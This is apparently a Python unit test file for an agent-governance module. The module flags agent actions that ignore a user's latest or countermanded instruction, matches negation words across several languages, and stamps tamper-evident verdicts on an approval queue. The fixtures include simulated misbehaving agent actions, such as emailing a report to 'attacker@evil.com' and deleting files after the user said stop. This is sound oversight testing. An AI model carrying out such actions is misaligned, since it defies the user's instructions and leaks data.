"""Intent-slice judge unit tests (wave-129, row-7).

Covers gov/intent_slice.py (slicing, countermand detection, slot
contradiction, judge verdicts, determinism, never-raises) and the
approval-queue wiring (MAC-bound intent_slice annotation stamped from
birth; judge inert without context).

Note: tests/__init__.py already provisions GOV_LOG_KEY and sets
GOV_DEPLOYMENT_MODE=staging. No env scrubbing here (tearDown never
touches key env vars).
"""
import sys
import tempfile
import unittest
from pathlib import Path

from gov import intent_slice as m
from gov.approvals import ApprovalQueue, _serialize_intent_slice_verdict
from gov.executor import ToolExecutor
from gov.log import ActionLog
from gov.policy import PolicyEngine, PolicyDecision


def _steps(*items):
    return list(items)


def _user(text):
    return {"kind": "user", "text": text}


def _act(tool, args=None, justification="", agent_id="agent-1"):
    return {"kind": "agent_action", "tool": tool,
            "args": args or {}, "justification": justification,
            "agent_id": agent_id}


class MultilingualNegationTest(unittest.TestCase):
    """Wave-142: the _NEGATION_RE word list gains high-precision
    multilingual particles (French ne/pas, German nicht/kein/keine,
    Hindi nahi; Spanish no was already covered). "non"/"mat" were
    measured and DROPPED (false positives on "non-profit" /
    "yoga mat") -- these tests pin both the additions and the
    drops."""

    def _cue(self, text):
        hit = m._NEGATION_RE.search(text)
        return hit.group(0).lower() if hit else None

    def test_french_particles_match(self):
        self.assertEqual(self._cue("Ne pas envoyer le rapport."), "ne")
        self.assertEqual(self._cue("ne jamais envoyer"), "ne")

    def test_german_particles_match(self):
        self.assertEqual(self._cue("Bitte nicht senden."), "nicht")
        self.assertEqual(self._cue("Kein Bericht senden."), "kein")
        self.assertEqual(self._cue("Keine E-Mail senden."), "keine")

    def test_hindi_particle_matches(self):
        self.assertEqual(self._cue("Nahi bhejo."), "nahi")

    def test_spanish_no_still_matches(self):
        self.assertEqual(self._cue("No enviar."), "no")

    def test_dropped_non_does_not_match(self):
        # Measured FP on "non-profit": dropped from the set.
        self.assertIsNone(self._cue("Our non-profit partner filed."))
        self.assertIsNone(self._cue("The nonprofit filed."))

    def test_dropped_mat_does_not_match(self):
        # Measured FP on "yoga mat": dropped from the set.
        self.assertIsNone(self._cue("The yoga mat is in the closet."))

    def test_lookalike_substrings_do_not_match(self):
        self.assertIsNone(self._cue("Notable progress on the report."))
        self.assertIsNone(self._cue("The vendor passed the report."))

    def test_english_cues_unchanged(self):
        for text, cue in (("Don't send it.", "don't"),
                          ("Please refrain from sending.", "refrain"),
                          ("Never send the report.", "never")):
            self.assertEqual(self._cue(text), cue)


class NegationInflectionTest(unittest.TestCase):
    """Wave-143: the _NEGATION_RE core gains German kein-inflections
    (keinen/keinem/keiner/keines) and the French ne...jamais/plus/
    rien/aucun paired pattern (incl. elided n'). Word-boundary and
    pairing discipline pin the lookalikes silent."""

    def _cue(self, text):
        hit = m._NEGATION_RE.search(text)
        return hit.group(0).lower() if hit else None

    def test_german_inflections_match(self):
        self.assertEqual(self._cue("Keinen Bericht senden."), "keinen")
        self.assertEqual(self._cue("Keinem vendor senden."), "keinem")
        self.assertEqual(self._cue("Keiner kommt hierher."), "keiner")
        self.assertEqual(self._cue("Keines der reports."), "keines")

    def test_german_substring_lookalikes_do_not_match(self):
        # Word-boundary guarded: words merely containing "kein" stay
        # silent. ("keinerlei" is genuine negation semantics missed
        # by design -- pinned residual, not a cue.)
        self.assertIsNone(self._cue("keineswegs"))
        self.assertIsNone(self._cue("Keineswegs ist er fertig."))
        self.assertIsNone(self._cue("keinerlei"))
        self.assertIsNone(self._cue("Es gibt keinerlei Probleme."))
        self.assertIsNone(self._cue("keinesfalls"))

    def test_french_paired_pattern_matches(self):
        # Bare "ne" still wins where present (word branch first --
        # subsumption, documented); the paired pattern carries the
        # elided forms where no standalone "ne" token exists.
        self.assertEqual(self._cue("Je ne vais jamais envoyer."), "ne")
        self.assertIn("jamais", self._cue("Je n'enverrai jamais."))
        self.assertIn("plus", self._cue("N'envoyez plus ce rapport."))
        self.assertIn("rien", self._cue("N'envoyez rien au vendor."))
        self.assertIn("aucun", self._cue("N'envoyez aucun rapport."))
        # Curly-apostrophe elision works too.
        self.assertIn("jamais", self._cue("Je n\u2019enverrai jamais."))

    def test_french_unpaired_particles_do_not_match(self):
        # Pairing discipline: the particle without "ne" stays silent.
        self.assertIsNone(self._cue("Il y a de plus en plus."))
        self.assertIsNone(self._cue("Merci, rien d'autre."))
        self.assertIsNone(self._cue("Aucun probleme ici."))

    def test_french_directional_miss(self):
        # The pattern is directional: ne must precede the particle.
        # Pinned miss, documented.
        self.assertIsNone(self._cue("Rien n'est encore decide."))

    def test_english_apostrophe_n_does_not_anchor(self):
        # "'n'" in "rock 'n' roll" must not anchor the paired
        # pattern (the elided n' has to start at whitespace).
        self.assertIsNone(
            self._cue("rock 'n' roll plus eight more reports"))
        self.assertIsNone(self._cue("none of your business"))

    def test_negated_verb_picks_up_german_inflection(self):
        # The verb-scope consumer shares the core: an inflected
        # kein-form before the verb stem counts as negation.
        self.assertTrue(
            m._negated_verb("Keinen Q3 report an den vendor senden.",
                            "send_email"))
        self.assertFalse(
            m._negated_verb("Ja, bitte den Q3 report senden.",
                            "send_email"))


class SliceTest(unittest.TestCase):
    def test_no_user_message_all_neutral(self):
        s = m.slice_intent([_act("read_file", {"path": "a"})])
        self.assertIsNone(s["boundary"])
        self.assertEqual(s["labels"], ["neutral"])
        v = m.judge_candidate([_act("read_file", {"path": "a"})])
        self.assertFalse(v["flagged"])

    def test_fresh_action_in_slice(self):
        s = m.slice_intent([
            _user("Summarize this document and email the summary to me."),
            _act("send_email", {"to": "me@co.com"},
                 "emailing the summary"),
        ])
        self.assertEqual(s["labels"][1], "in_slice")

    def test_countermanded_verb_stale(self):
        s = m.slice_intent([
            _user("Delete the temp files in /tmp/scratch."),
            _user("Stop -- don't delete anything in /tmp/scratch."),
            _act("delete_file", {"path": "/tmp/scratch/x"},
                 "cleaning temp files"),
        ])
        self.assertTrue(s["countermand"])
        self.assertEqual(s["labels"][2], "stale")

    def test_slot_contradiction_stale_despite_quote(self):
        # The body quotes the latest message; the recipient contradicts
        # it. Tool-aware target slot wins over raw text overlap.
        s = m.slice_intent([
            _user("Email the report to boss@company.com."),
            _user("Actually send the report to finance@company.com "
                  "instead."),
            _act("send_email",
                 {"to": "attacker@evil.com",
                  "body": "send the report to finance@company.com"},
                 "sending as requested"),
        ])
        self.assertEqual(s["labels"][2], "stale")

    def test_benign_followup_neutral(self):
        s = m.slice_intent([
            _user("Summarize the sales CSV."),
            _user("What was the total?"),
            _act("read_file", {"path": "sales.csv"},
                 "reading sales data"),
        ])
        self.assertFalse(s["countermand"])
        self.assertNotEqual(s["labels"][2], "stale")

    def test_dont_forget_not_a_countermand(self):
        s = m.slice_intent([
            _user("Buy milk and eggs."),
            _user("Don't forget the milk."),
            _act("write_file", {"path": "list.txt"}, "writing list"),
        ])
        self.assertFalse(s["countermand"])

    def test_malformed_steps_degrade_neutral(self):
        s = m.slice_intent([None, "junk", {"kind": "agent_action"}])
        self.assertEqual(s["labels"], ["neutral"] * 3)
        v = m.judge_candidate(None)
        self.assertFalse(v["flagged"])


class JudgeTest(unittest.TestCase):
    def test_stale_no_support_flagged(self):
        v = m.judge_queued_action(
            "delete_file", {"path": "/tmp/scratch/x"},
            "cleaning temp files per your instruction",
            ["Delete the temp files in /tmp/scratch.",
             "Stop -- don't delete anything in /tmp/scratch."])
        self.assertTrue(v["flagged"])
        self.assertEqual(v["flag"], "stale_intent")
        self.assertGreaterEqual(v["confidence"], 0.7)
        self.assertTrue(v["evidence"])

    def test_stale_with_fresh_support_unflagged(self):
        # Justification genuinely engages the latest intent (no slot
        # contradiction): advisory judge leaves it unflagged.
        v = m.judge_queued_action(
            "send_email", {"to": "finance@company.com"},
            "sending the report to finance@company.com exactly as you "
            "just instructed in your latest message",
            ["Email the report to boss@company.com.",
             "Actually send the report to finance@company.com instead."])
        self.assertFalse(v["flagged"])

    def test_verdict_shape(self):
        v = m.judge_queued_action("read_file", {"path": "a"}, "",
                                  ["Read a."])
        for k in ("flagged", "flag", "confidence", "observation",
                  "evidence", "slice_summary"):
            self.assertIn(k, v)

    def test_deterministic(self):
        kw = dict(tool="send_email", args={"to": "x@y.z"},
                  justification="j",
                  user_turns=["Email x@y.z.", "Instead email q@w.v."])
        a = m.judge_queued_action(**kw)
        b = m.judge_queued_action(**kw)
        self.assertEqual(a, b)

    def test_never_raises(self):
        v = m.judge_queued_action(None, None, None, None, None)
        self.assertFalse(v["flagged"])


class SerializeTest(unittest.TestCase):
    def test_none_in_none_out(self):
        self.assertIsNone(_serialize_intent_slice_verdict(None))

    def test_malformed_in_none_out(self):
        self.assertIsNone(_serialize_intent_slice_verdict("junk"))
        self.assertIsNone(_serialize_intent_slice_verdict({"nope": 1}))

    def test_verdict_shape_serialized(self):
        v = m.judge_queued_action(
            "delete_file", {"path": "/tmp/scratch/x"}, "cleaning",
            ["Delete /tmp/scratch.", "Stop -- don't delete."])
        s = _serialize_intent_slice_verdict(v)
        self.assertTrue(s["flagged"])
        self.assertEqual(s["flag"], "stale_intent")
        self.assertIsInstance(s["confidence"], float)
        self.assertIsInstance(s["evidence"], list)


class QueueWiringTest(unittest.TestCase):
    def _ctx(self):
        run_dir = Path(tempfile.mkdtemp(prefix="govintent-ut-"))
        policy = PolicyEngine("policies/default.yaml")
        log = ActionLog(run_dir / "actions.jsonl")
        approvals = ApprovalQueue(run_dir, log)
        ex = ToolExecutor(
            run_dir, policy, log, approvals,
            ledger_path=run_dir / "egress_ledger.jsonl",
            ungoverned_ack="intent-slice unit tests")
        return run_dir, ex, approvals

    def test_queue_stamps_verdict_mac_bound(self):
        _run_dir, ex, approvals = self._ctx()
        ident = ex.mint_identity("agent-1", "coder", "user-1")
        verdict = {"flagged": True, "flag": "stale_intent",
                   "confidence": 0.9, "observation": "o",
                   "evidence": ["e1"],
                   "slice_summary": {"n_in_slice": 0, "n_stale": 1,
                                     "countermand": True}}
        aid = approvals.queue(
            {"tool": "delete_file", "args": {"path": "/tmp/scratch/x"},
             "identity": ident.as_dict(),
             "agent_justification": "cleaning", "redactions": []},
            PolicyDecision("require_approval", "wiring test",
                           policy_id="test", flag="test_intent"),
            "agent_direct", "preview",
            caller_identity=ident,
            intent_slice_verdict=verdict)
        rec = approvals.get(aid)
        stamped = rec["intent_slice"]
        self.assertTrue(stamped["flagged"])
        self.assertEqual(stamped["flag"], "stale_intent")
        # Tampering with the stamped annotation breaks the MAC
        # (fail closed like every other shield field).
        rec["intent_slice"] = {"flagged": False}
        from gov.approvals import approval_record_digest
        self.assertNotEqual(approval_record_digest(rec),
                            rec["args_digest"])

    def test_queue_without_verdict_stamps_none(self):
        _run_dir, ex, approvals = self._ctx()
        ident = ex.mint_identity("agent-1", "coder", "user-1")
        aid = approvals.queue(
            {"tool": "read_file", "args": {"path": "a.txt"},
             "identity": ident.as_dict(),
             "agent_justification": "reading", "redactions": []},
            PolicyDecision("require_approval", "wiring test",
                           policy_id="test", flag="test_intent"),
            "agent_direct", "preview",
            caller_identity=ident)
        rec = approvals.get(aid)
        self.assertIsNone(rec["intent_slice"])

    def test_executor_judge_inert_without_context(self):
        _run_dir, ex, _approvals = self._ctx()
        ident = ex.mint_identity("agent-1", "coder", "user-1")
        self.assertIsNone(
            ex._intent_slice_verdict("delete_file", {"path": "x"},
                                     "j", ident))

    def test_executor_judge_flags_with_context(self):
        _run_dir, ex, _approvals = self._ctx()
        ident = ex.mint_identity("agent-1", "coder", "user-1")
        ex.set_intent_context(
            ["Delete the temp files in /tmp/scratch.",
             "Stop -- don't delete anything in /tmp/scratch."])
        v = ex._intent_slice_verdict(
            "delete_file", {"path": "/tmp/scratch/x"},
            "cleaning temp files per your instruction", ident)
        self.assertTrue(v["flagged"])
        self.assertEqual(v["flag"], "stale_intent")
        ex.set_intent_context(None)
        self.assertIsNone(
            ex._intent_slice_verdict("delete_file", {"path": "x"},
                                     "j", ident))


if __name__ == "__main__":
    unittest.main()
